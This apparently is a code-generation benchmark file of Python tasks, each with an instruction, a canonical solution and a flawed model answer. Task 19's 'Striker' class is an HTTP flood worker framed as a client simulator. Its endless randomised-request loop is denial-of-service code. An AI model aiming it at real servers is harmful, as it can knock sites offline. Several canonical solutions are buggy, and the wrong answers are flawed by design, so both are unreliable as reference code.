chunk:\n                    continue\n                if isinstance(chunk, str):\n                    chunk = chunk.encode(\"utf-8\")\n                if chunked:\n                    self.send(b\"%x\\r\\n%b\\r\\n\" % (len(chunk), chunk))\n                else:\n                    self.send(chunk)\n\n        if chunked:\n            self.send(b\"0\\r\\n\\r\\n\")\n\n    def getresponse(self) -> HTTPResponse:\n        if self._response_options is None:\n            raise ResponseNotReady()\n\n        resp_options = self._response_options\n        self._response_options = None\n        self.sock.settimeout(self.timeout)\n\n        httplib_response = super().getresponse()\n        headers = HTTPHeaderDict(httplib_response.msg.items())\n\n        response = HTTPResponse(\n            body=httplib_response,\n            headers=headers,\n            status=httplib_response.status,\n            version=httplib_response.version,\n            version_string=getattr(self, \"_http_vsn_str\", \"HTTP/?\"),\n            reason=httplib_response.reason,\n            preload_content=resp_options.preload_content,\n            decode_content=resp_options.decode_content,\n            original_response=httplib_response,\n            enforce_content_length=resp_options.enforce_content_length,\n            request_method=resp_options.request_method,\n            request_url=resp_options.request_url,\n        )\n        return response\n\n    def close(self) -> None:\n        try:\n            super().close()\n        finally:\n            self.sock = None\n            self.is_verified = False\n            self.proxy_is_verified = None\n            self._has_connected_to_proxy = False\n            self._response_options = None\n            self._tunnel_host = None\n            self._tunnel_port = None\n            self._tunnel_scheme = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import http.client\nimport socket\nimport typing\nfrom urllib.parse import urlparse\n\nclass CustomHTTPConnection(http.client.HTTPConnection):\n    default_port: typing.ClassVar[int] = 80\n    default_socket_options: typing.ClassVar[list[tuple[int, int]]] = [(socket.SOL_TCP, socket.TCP_NODELAY)]\n    socket_options: typing.Optional[list[tuple[int, int]]] = None\n    proxy: typing.Optional[str] = None\n    proxy_config: typing.Optional[typing.Any] = None\n    _has_connected_to_proxy: bool = False\n    _response_options: typing.Optional[typing.Any] = None\n    _tunnel_host: typing.Optional[str] = None\n    _tunnel_port: typing.Optional[int] = None\n    _tunnel_scheme: typing.Optional[str] = None\n\n    def __init__(self, host: str, port: typing.Optional[int] = None, *, timeout: typing.Any = None, source_address: typing.Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: typing.Optional[list[tuple[int, int]]] = None, proxy: typing.Optional[str] = None, proxy_config: typing.Optional[typing.Any] = None) -> None:\n        super().__init__(host, port, timeout=timeout, source_address=source_address)\n        self.socket_options = socket_options or self.default_socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._tunnel_host = None\n        self._tunnel_port = None\n        self._tunnel_scheme = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = socket.create_connection(\n                (self.host, self.port),\n                timeout=self.timeout,\n                source_address=self.source_address\n            )\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to connect to {self.host}:{self.port}: {e}\") from e\n        if self.socket_options:\n            for opt in self.socket_options:\n                sock.setsockopt(*opt)\n        return sock\n\n    def connect(self):\n        if self.proxy:\n            proxy_info = self.proxy_config or {}\n            proxy_host = proxy_info.get('host')\n            proxy_port = proxy_info.get('port', self.default_port)\n            self._tunnel_host = self.host\n            self._tunnel_port = self.port\n            self._tunnel_scheme = 'http'\n            try:\n                self._connect_to_proxy(proxy_host, proxy_port)\n                self._tunnel_to_target()\n            except Exception as e:\n                self.close()\n                raise\n        else:\n            super().connect()\n\n    def _connect_to_proxy(self, proxy_host: str, proxy_port: int) -> None:\n        self._tunnel_host = proxy_host\n        self._tunnel_port = proxy_port\n        self._tunnel_scheme = 'http'\n        self._new_conn()\n        self.sock.connect((proxy_host, proxy_port))\n\n    def _tunnel_to_target(self) -> None:\n        self.request(\"CONNECT\", f\"{self._tunnel_host}:{self._tunnel_port}\")\n        response = self.getresponse()\n        if response.status == 200:\n            self.host = self._tunnel_host\n            self.port = self._tunnel_port\n            self._has_connected_to_proxy = True\n        else:\n            raise Exception(f\"Proxy tunnel failed: {response.status} {response.reason}\")\n\n    def request(self, method: str, url: str, body: typing.Optional[bytes] = None, headers: typing.Optional[dict[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None:\n        if self.proxy:\n            self._tunnel_host = urlparse(url).hostname\n            self._tunnel_port = urlparse(url).port\n            self._tunnel_scheme = 'http'\n            self._connect_to_proxy(self._tunnel_host, self._tunnel_port)\n            self._tunnel_to_target()\n            super().request(method, url, body, headers, chunked=chunked, preload_content=preload_content, decode_content=decode_content, enforce_content_length=enforce_content_length)\n        else:\n            super().request(method, url, body, headers, chunked=chunked, preload_content=preload_content, decode_content=decode_content, enforce_content_length=enforce_content_length)\n\n    def getresponse(self) -> http.client.HTTPResponse:\n        if self.proxy and self._has_connected_to_proxy:\n            return super().getresponse()\n        else:\n            return super().getresponse()\n\n    def close(self) -> None:\n        if self.sock:\n            self.sock.close()\n        super().close()"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a simple web application using Flask that interacts with Redis to track and display the number of times the homepage has been accessed.\n\nFunction Description: The function `hello()` is a Flask route handler for the root URL ('/'). It increments a counter in Redis each time the route is accessed and returns a greeting message along with the current count of visits.\n\nInput: \n- None (The function handles HTTP GET requests to the root URL without requiring explicit input parameters)\n\nOutput: \n- A string response containing \"Hello World!\" followed by the current visit count in the format: \"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\" where {count} is the number of times the page has been accessed.",
    "Canonical_solution": "from flask import Flask\nfrom redis import Redis\n\napp = Flask(__name__)\nredis = Redis(host='redis', port=6379)\n\n@app.route('/')\ndef hello():\n    count = redis.incr('hits')\n    return 'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {} \u6b21\u3002\\n'.format(count)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask\nimport redis\n\napp = Flask(__name__)\nredis_client = redis.StrictRedis(host='localhost', port=6379, db=0)\n\n@app.route('/')\ndef hello():\n    count = redis_client.incr('visit_count')\n    return f\"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Create a Python class that implements an API server using Flask and gevent WSGI server, capable of serving web UI and handling REST API requests with proper error handling.\n\nClass Description: APIServer is a class that encapsulates a Flask web server with gevent WSGI capabilities. It handles server lifecycle management, web UI serving, and error handling for REST API endpoints.\n\nAttributes:\n- stop_event: [Event] - A gevent event used to signal server shutdown\n- config: [RestApiConfig] - Configuration object containing server settings (host, port, etc.)\n- rest_api: [RestAPI] - Reference to the main REST API implementation\n- wsgiserver: [Optional[WSGIServer]] - The gevent WSGI server instance\n- flask_app: [Flask] - The Flask application instance\n\nMethods:\n- __init__(rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None - Initializes the API server with configuration and dependencies\n- _serve_webui(file_name: str = \"index.html\") -> Response - Serves web UI files from configured directory (handles fallback to index.html)\n- _run() -> None - Internal method to run the WSGI server indefinitely\n- start() -> None - Starts the API server and initializes the WSGI server\n- stop() -> None - Stops the API server gracefully\n- unhandled_exception(exception: Exception) -> Response - Global exception handler that returns error responses and logs critical errors",
    "Canonical_solution": "import errno\nimport logging\nimport socket\nfrom typing import Optional\n\nimport gevent\nimport gevent.pool\nfrom flask import Flask\nfrom gevent.event import Event\nfrom gevent.pywsgi import WSGIServer\nfrom werkzeug.exceptions import NotFound\n\nclass APIServer:\n    def __init__(\n        self,\n        rest_api: \"RestAPI\",\n        config: RestApiConfig,\n        eth_rpc_endpoint: str = None,\n    ) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n\n        flask_app = Flask(__name__)\n        self.flask_app = flask_app\n\n        self.flask_app.register_error_handler(HTTPStatus.NOT_FOUND, endpoint_not_found)\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n\n        if config.web_ui_enabled:\n            for route in (\"/ui/<path:file_name>\", \"/ui\", \"/ui/\", \"/index.html\", \"/\"):\n                self.flask_app.add_url_rule(\n                    route, route, view_func=self._serve_webui, methods=(\"GET\",)\n                )\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            if not file_name:\n                raise NotFound\n\n            response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], file_name)\n        except (NotFound, AssertionError):\n            if file_name.endswith(\".json\"):\n                response = api_error(\n                    \"Service unavailable, try again later\", HTTPStatus.SERVICE_UNAVAILABLE\n                )\n            else:\n                response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], \"index.html\")\n        return response\n\n    def _run(self) -> None:\n        try:\n            if self.wsgiserver is not None:\n                self.wsgiserver.serve_forever()\n        except gevent.GreenletExit:\n            raise\n        except Exception:\n            self.stop()\n            raise\n\n    def start(self) -> None:\n        self.stop_event.clear()\n\n        wsgi_log = logging.getLogger(__name__ + \".pywsgi\")\n        pool = gevent.pool.Pool()\n        wsgiserver = WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            log=wsgi_log,\n            error_log=wsgi_log,\n            spawn=pool,\n        )\n\n        try:\n            wsgiserver.init_socket()\n        except socket.error as e:\n            if e.errno == errno.EADDRINUSE:\n                raise APIServerPortInUseError(f\"{self.config.host}:{self.config.port}\")\n            raise\n\n        self.wsgiserver = wsgiserver\n        super().start()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n\n        if self.wsgiserver is not None:\n            self.wsgiserver.stop(timeout=5)\n            self.wsgiserver = None\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        log.critical(\n            \"Unhandled exception when processing endpoint request\",\n            exc_info=True,\n            node=self.rest_api.checksum_address,\n        )\n        self.greenlet.kill(exception)\n        return api_error([str(exception)], HTTPStatus.INTERNAL_SERVER_ERROR)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, Response\nimport gevent.wsgi\nimport gevent\nfrom gevent.event import Event\nimport logging\nimport json\nfrom typing import Optional, Any\n\nclass APIServer:\n    def __init__(self, rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None):\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver = None\n        self.flask_app = Flask(__name__)\n\n        self.flask_app.errorhandler(Exception)(self.unhandled_exception)\n\n        self.flask_app.add_url_rule('/webui/<path:filename>', 'serve_webui', self._serve_webui)\n        self.rest_api.setup_routes(self.flask_app)\n\n        self.webui_dir = config.webui_dir\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            return self.flask_app.send_from_directory(self.webui_dir, file_name)\n        except FileNotFoundError:\n            return self.flask_app.send_from_directory(self.webui_dir, \"index.html\")\n\n    def _run(self) -> None:\n        self.wsgiserver = gevent.wsgi.WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            spawn=True\n        )\n        self.greenlet = gevent.spawn(self._run_server)\n\n    def _run_server(self):\n        while not self.stop_event.is_set():\n            try:\n                self.wsgiserver.serve_forever(1)\n            except KeyboardInterrupt:\n                self.stop_event.set()\n\n    def start(self) -> None:\n        self._run()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n        self.greenlet.join()\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        logging.error(\"Unhandled exception: %s\", exception, exc_info=True)\n        return Response(json.dumps({\"error\": \"Internal server error\"}), status=500, mimetype='application/json')"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a RESTful API for a Todo application using Flask and Flask-RESTx that supports CRUD operations (Create, Read, Update, Delete) for todo items.\n\nClass Description: TodoAPI is a class that encapsulates the functionality of a Todo REST API. It initializes a Flask application, sets up API routes, defines data models, and manages todo items through a data access object (DAO).\n\nAttributes:\n- app: Flask - The Flask application instance\n- api: Api - The Flask-RESTx API instance for route registration\n- ns: Namespace - The namespace for organizing todo-related routes\n- todo: Model - The data model for todo items\n- todo_dao: TodoDAO - The data access object for managing todo items\n\nMethods:\n- __init__() -> None - Initializes the Flask app, API, namespace, data model, and sample data\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run() -> None - Starts the Flask development server\n\nClass Description: TodoDAO is a helper class that manages the storage and retrieval of todo items in memory.\n\nAttributes:\n- counter: int - Auto-incrementing counter for todo IDs\n- todos: list - List storing all todo items\n\nMethods:\n- get(id: int) -> dict - Retrieves a todo item by ID or aborts with 404 if not found\n- create(data: dict) -> dict - Creates a new todo item with an auto-generated ID\n- update(id: int, data: dict) -> dict - Updates an existing todo item\n- delete(id: int) -> None - Deletes a todo item by ID",
    "Canonical_solution": "from flask import Flask\nfrom flask_restx import Api, Resource, fields\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.wsgi_app = ProxyFix(self.app.wsgi_app)\n        self.api = Api(\n            self.app,\n            version=\"1.0\",\n            title=\"TodoMVC API\",\n            description=\"A simple TodoMVC API\",\n        )\n        self.ns = self.api.namespace(\"todos\", description=\"TODO operations\")\n        \n        self.todo = self.api.model(\n            \"Todo\",\n            {\n                \"id\": fields.Integer(readonly=True, description=\"The task unique identifier\"),\n                \"task\": fields.String(required=True, description=\"The task details\"),\n            },\n        )\n        \n        self.todo_dao = TodoDAO()\n        self.todo_dao.create({\"task\": \"Build an API\"})\n        self.todo_dao.create({\"task\": \"?????\"})\n        self.todo_dao.create({\"task\": \"profit!\"})\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route(\"/\")\n        class TodoList(Resource):\n            @self.ns.doc(\"list_todos\")\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                return self.todo_dao.todos\n\n            @self.ns.doc(\"create_todo\")\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                return self.todo_dao.create(self.api.payload), 201\n\n        @self.ns.route(\"/<int:id>\")\n        @self.ns.response(404, \"Todo not found\")\n        @self.ns.param(\"id\", \"The task identifier\")\n        class Todo(Resource):\n            @self.ns.doc(\"get_todo\")\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                return self.todo_dao.get(id)\n\n            @self.ns.doc(\"delete_todo\")\n            @self.ns.response(204, \"Todo deleted\")\n            def delete(self, id):\n                self.todo_dao.delete(id)\n                return \"\", 204\n\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                return self.todo_dao.update(id, self.api.payload)\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 0\n        self.todos = []\n\n    def get(self, id):\n        for todo in self.todos:\n            if todo[\"id\"] == id:\n                return todo\n        self.api.abort(404, \"Todo {} doesn't exist\".format(id))\n\n    def create(self, data):\n        todo = data\n        todo[\"id\"] = self.counter = self.counter + 1\n        self.todos.append(todo)\n        return todo\n\n    def update(self, id, data):\n        todo = self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id):\n        todo = self.get(id)\n        self.todos.remove(todo)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask\nfrom flask_restx import Api, Namespace, reqparse\nfrom flask_restx import inputs\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 1\n        self.todos = []\n\n    def get(self, id: int) -> dict:\n        todo = next((t for t in self.todos if t['id'] == id), None)\n        if not todo:\n            return {'error': 'Todo not found'}, 404\n        return todo\n\n    def create(self, data: dict) -> dict:\n        todo = {\n            'id': self.counter,\n            'title': data.get('title'),\n            'description': data.get('description'),\n            'completed': data.get('completed', False)\n        }\n        self.todos.append(todo)\n        self.counter += 1\n        return todo\n\n    def update(self, id: int, data: dict) -> dict:\n        todo = next((t for t in self.todos if t['id'] == id), None)\n        if not todo:\n            return {'error': 'Todo not found'}, 404\n        todo['title'] = data.get('title', todo['title'])\n        todo['description'] = data.get('description', todo['description'])\n        todo['completed'] = data.get('completed', todo['completed'])\n        return todo\n\n    def delete(self, id: int) -> None:\n        global todos\n        todos = [t for t in todos if t['id'] != id]\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.api = Api(self.app)\n        self.ns = Namespace('todos', description='Todo operations')\n        self.todo = self.ns.model('Todo', {\n            'id': int,\n            'title': str,\n            'description': str,\n            'completed': bool\n        })\n        self.todo_dao = TodoDAO()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.ns.route('/<int:id>', methods=['GET', 'PUT', 'DELETE'])\n        self.ns.route('/', methods=['POST'])\n        self.api.add_namespace(self.ns)\n\n    def run(self):\n        self.app.run(debug=True)\n\nif __name__ == '__main__':\n    app = TodoAPI()\n    app.run()\n```"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Create a Python class that simulates multiple HTTP clients making concurrent requests to a target server, tracking successful and failed requests, with support for both HTTP and HTTPS protocols.\n\nClass Description: Striker is a Process subclass designed to simulate multiple concurrent HTTP clients. It creates and manages multiple socket connections to a target server, sends randomized HTTP requests, tracks request counts, and handles connection cleanup.\n\nAttributes:\n- counter: [list] - Shared counter for tracking successful and failed requests (index 0 for success, 1 for failures)\n- nr_socks: [int] - Number of concurrent socket connections to maintain\n- runnable: [bool] - Control flag for the main execution loop\n- socks: [list] - List of active socket connections\n- ssl: [bool] - Flag indicating whether to use HTTPS\n- host: [str] - Target server hostname\n- url: [str] - Base URL path for requests\n- port: [int] - Target server port number\n- referers: [list] - List of referer URLs for request randomization\n\nMethods:\n- __init__(url, nr_sockets, counter) -> [None] - Initializes the Striker with target URL, connection count, and shared counter\n- run() -> [None] - Main execution loop that creates connections, sends requests, and processes responses\n- closeConnections() -> [None] - Closes all active socket connections\n- createPayload() -> [tuple] - Generates randomized request payload (URL and headers)\n- generateData() -> [tuple] - Creates request URL with random query string and headers\n- stop() -> [None] - Stops the execution loop and cleans up resources\n- incCounter() -> [None] - Increments the success counter\n- incFailed() -> [None] - Increments the failure counter",
    "Canonical_solution": "from multiprocessing import Process, Manager\nimport urlparse\nimport random\nimport sys\n\nif sys.version_info < (3,0):\n    import httplib\n    HTTPCLIENT = httplib\nelse:\n    import http.client\n    HTTPCLIENT = http.client\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super(Striker, self).__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        \n        parsedUrl = urlparse.urlparse(url)\n        self.ssl = parsedUrl.scheme == 'https'\n        self.host = parsedUrl.netloc.split(':')[0]\n        self.url = parsedUrl.path\n        self.port = parsedUrl.port or (443 if self.ssl else 80)\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://' + self.host + '/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            try:\n                for i in range(self.nr_socks):\n                    if self.ssl:\n                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)\n                    else:\n                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)\n                    self.socks.append(c)\n\n                for conn_req in self.socks:\n                    (url, headers) = self.createPayload()\n                    conn_req.request('GET', url, None, headers)\n\n                for conn_resp in self.socks:\n                    resp = conn_resp.getresponse()\n                    self.incCounter()\n\n                self.closeConnections()\n            except:\n                self.incFailed()\n\n    def closeConnections(self):\n        for conn in self.socks:\n            try:\n                conn.close()\n            except:\n                pass\n\n    def createPayload(self):\n        req_url, headers = self.generateData()\n        random_keys = headers.keys()\n        random.shuffle(random_keys)\n        random_headers = {}\n        for header_name in random_keys:\n            random_headers[header_name] = headers[header_name]\n        return (req_url, random_headers)\n\n    def generateData(self):\n        param_joiner = \"&\" if self.url.count(\"?\") > 0 else \"?\"\n        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))\n        http_headers = self.generateRandomHeaders()\n        return (request_url, http_headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n        self.terminate()\n\n    def incCounter(self):\n        try:\n            self.counter[0] += 1\n        except:\n            pass\n\n    def incFailed(self):\n        try:\n            self.counter[1] += 1\n        except:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import socket\nimport ssl\nimport random\nimport time\nfrom urllib.parse import urlparse\nimport multiprocessing\n\nclass Striker(multiprocessing.Process):\n    def __init__(self, url, nr_sockets, counter):\n        super().__init__()\n        self.url = url\n        self.nr_socks = nr_sockets\n        self.counter = counter\n        self.runnable = True\n        self.socks = []\n        self.ssl = False\n        self.host = ''\n        self.port = 80\n        self.referers = ['http://example.com', 'http://test.com']\n        parsed = urlparse(url)\n        self.host = parsed.hostname\n        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)\n        self.ssl = parsed.scheme == 'https'\n\n    def run(self):\n        self.runnable = True\n        while self.runnable:\n            while len(self.socks) < self.nr_socks:\n                sock = self.createSocket()\n                self.socks.append(sock)\n            for sock in self.socks:\n                payload = self.generateData()\n                self.sendRequest(sock, payload)\n                response = self.receiveResponse(sock)\n                if self.isSuccess(response):\n                    self.incCounter()\n                else:\n                    self.incFailed()\n            time.sleep(0.1)\n\n    def closeConnections(self):\n        for sock in self.socks:\n            sock.close()\n        self.socks.clear()\n\n    def createSocket(self):\n        if self.ssl:\n            context = ssl.create_default_context()\n            sock = socket.create_connection((self.host, self.port), timeout=5)\n            sock = context.wrap_socket(sock, server_hostname=self.host)\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((self.host, self.port))\n        return sock\n\n    def generateData(self):\n        query_params = {}\n        for _ in range(3):\n            key = f'param_{random.randint(1, 100)}'\n            value = f'value_{random.randint(1, 100)}'\n            query_params[key] = value\n        query_string = '&'.join([f'{k}={v}' for k, v in query_params.items()])\n        full_url = f\"{self.url}?{query_string}\"\n        headers = {\n            'User-Agent': 'Mozilla/5.0',\n            'Referer': random.choice(self.referers)\n        }\n        return full_url, headers\n\n    def sendRequest(self, sock, payload):\n        url, headers = payload\n        request = f\"GET {url} HTTP/1.1\\r\\n\"\n        for key, value in headers.items():\n            request += f\"{key}: {value}\\r\\n\"\n        request += f\"Host: {self.host}\\r\\n\"\n        request += \"Connection: close\\r\\n\\r\\n\"\n        sock.sendall(request.encode('utf-8'))\n\n    def receiveResponse(self, sock):\n        response = b''\n        while True:\n            data = sock.recv(4096)\n            if not data:\n                break\n            response += data\n        return response.decode('utf-8')\n\n    def isSuccess(self, response):\n        first_line = response.split('\\r\\n')[0]\n        status_code = int(first_line.split()[1])\n        return 200 <= status_code < 400\n\n    def stop(self):\n        self.runnable = False\n\n    def incCounter(self):\n        self.counter[0] += 1\n\n    def incFailed(self):\n        self.counter[1] += 1"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a WhatsApp client class that interacts with the WhatsApp Business API to send text messages to users.\n\nClass Description: The WhatsAppClient class encapsulates functionality for sending text messages through the WhatsApp Business API. It handles authentication, API endpoint construction, and message payload preparation.\n\nAttributes:\nAPI_URL: str - Base URL for the WhatsApp Business API (default: \"https://graph.facebook.com/v17.0/\")\nWHATSAPP_API_TOKEN: str - Temporary access token for authenticating with the WhatsApp API\nWHATSAPP_CLOUD_NUMBER_ID: str - Phone number ID associated with the WhatsApp Business account\nheaders: dict - HTTP headers containing authorization and content type information\n\nMethods:\n__init__: () -> None - Initializes the WhatsAppClient instance by setting up authorization headers and constructing the base API URL\nsend_text_message: (message: str, phone_number: str) -> int - Sends a text message to the specified phone number via WhatsApp API and returns the HTTP status code",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nimport os\nimport requests\nimport json\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    WHATSAPP_API_TOKEN = \"<Temporary access token from your WhatsApp API Setup>\"\n    WHATSAPP_CLOUD_NUMBER_ID = \"<Phone number ID from your WhatsApp API Setup>\"\n\n    def __init__(self):\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        self.API_URL = self.API_URL + self.WHATSAPP_CLOUD_NUMBER_ID\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": 'whatsapp',\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"preview_url\": False,\n                \"body\": message\n            }\n        }\n        response = requests.post(f\"{self.API_URL}/messages\", json=payload, headers=self.headers)\n        print(response.status_code)\n        assert response.status_code == 200, \"Error sending message\"\n        return response.status_code\n\napp = Flask(__name__)\n\n@app.route('/msgrcvd', methods=['POST', 'GET'])\ndef msgrcvd():\n    message = request.args.get('message')\n    answer = llm(message)\n    print(message)\n    print(answer)\n    client.send_text_message(llm(message), \"<your phone number>\")\n    return message + \"<p/>\" + answer",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "import requests\n\nclass WhatsAppClient:\n    def __init__(self, api_url: str = \"https://graph.facebook.com/v17.0/\", token: str, cloud_number_id: str):\n        self.API_URL = api_url\n        self.WHATSAPP_API_TOKEN = token\n        self.WHATSAPP_CLOUD_NUMBER_ID = cloud_number_id\n        self.headers = {\n            \"Authorization\": f\"Bearer {token}\",\n            \"Content-Type\": \"application/json\"\n        }\n\n    def send_text_message(self, message: str, phone_number: str) -> int:\n        url = f\"{self.API_URL}{self.WHATSAPP_CLOUD_NUMBER_ID}/messages\"\n        payload = {\n            \"messaging_product\": \"whatsapp\",\n            \"recipient_type\": \"individual\",\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"body\": message\n            }\n        }\n        response = requests.post(url, json=payload, headers=self.headers)\n        return response.status_code"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Flask-based HTTP server to visualize and navigate through a robot dataset, allowing users to view different episodes and associated metadata.\n\nFunction Description: The `run_server` function initializes and runs a Flask web server that provides a user interface for exploring robot datasets. It handles dataset navigation, episode selection, and displays relevant information including videos and task descriptions. The server supports both local datasets and remote datasets hosted on Hugging Face.\n\nInput:\n- dataset: Union[LeRobotDataset, IterableNamespace, None] - The dataset to visualize (can be None if loading from URL)\n- episodes: Optional[List[int]] - List of episode IDs to make available (None for all episodes)\n- host: str - Host address to run the server on\n- port: str - Port number to run the server on\n- static_folder: Path - Path to static files directory\n- template_folder: Path - Path to HTML templates directory\n\nOutput: None (runs a Flask server indefinitely until interrupted)\n\nMethods (route handlers):\n1. homepage() -> Union[Redirect, Response] - Handles root URL, redirects to first episode or shows dataset selection page\n2. show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect - Redirects to the first episode of a specified dataset\n3. show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]] - Displays detailed information for a specific episode including videos and task data\n\nThe server provides the following features:\n- Dataset version validation\n- Episode navigation\n- Video playback\n- Task description display\n- Data visualization\n- Support for both local and remote datasets\n- Featured datasets showcase",
    "Canonical_solution": "import argparse\nimport json\nimport logging\nimport re\nimport shutil\nimport tempfile\nfrom pathlib import Path\n\nimport requests\nfrom flask import Flask, redirect, render_template, request, url_for\n\ndef run_server(\n    dataset: LeRobotDataset | IterableNamespace | None,\n    episodes: list[int] | None,\n    host: str,\n    port: str,\n    static_folder: Path,\n    template_folder: Path,\n):\n    app = Flask(__name__, static_folder=static_folder.resolve(), template_folder=template_folder.resolve())\n    app.config[\"SEND_FILE_MAX_AGE_DEFAULT\"] = 0  # specifying not to cache\n\n    @app.route(\"/\")\n    def hommepage(dataset=dataset):\n        if dataset:\n            dataset_namespace, dataset_name = dataset.repo_id.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=0,\n                )\n            )\n\n        dataset_param, episode_param = None, None\n        all_params = request.args\n        if \"dataset\" in all_params:\n            dataset_param = all_params[\"dataset\"]\n        if \"episode\" in all_params:\n            episode_param = int(all_params[\"episode\"])\n\n        if dataset_param:\n            dataset_namespace, dataset_name = dataset_param.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=episode_param if episode_param is not None else 0,\n                )\n            )\n\n        featured_datasets = [\n            \"lerobot/aloha_static_cups_open\",\n            \"lerobot/columbia_cairlab_pusht_real\",\n            \"lerobot/taco_play\",\n        ]\n        return render_template(\n            \"visualize_dataset_homepage.html\",\n            featured_datasets=featured_datasets,\n            lerobot_datasets=available_datasets,\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>\")\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode_id = 0\n        return redirect(\n            url_for(\n                \"show_episode\",\n                dataset_namespace=dataset_namespace,\n                dataset_name=dataset_name,\n                episode_id=first_episode_id,\n            )\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>/episode_<int:episode_id>\")\n    def show_episode(dataset_namespace, dataset_name, episode_id, dataset=dataset, episodes=episodes):\n        repo_id = f\"{dataset_namespace}/{dataset_name}\"\n        try:\n            if dataset is None:\n                dataset = get_dataset_info(repo_id)\n        except FileNotFoundError:\n            return (\n                \"Make sure to convert your LeRobotDataset to v2 & above. See how to convert your dataset at https://github.com/huggingface/lerobot/pull/461\",\n                400,\n            )\n        dataset_version = (\n            dataset.meta._version if isinstance(dataset, LeRobotDataset) else dataset.codebase_version\n        )\n        match = re.search(r\"v(\\d+)\\.\", dataset_version)\n        if match:\n            major_version = int(match.group(1))\n            if major_version < 2:\n                return \"Make sure to convert your LeRobotDataset to v2 & above.\"\n\n        episode_data_csv_str, 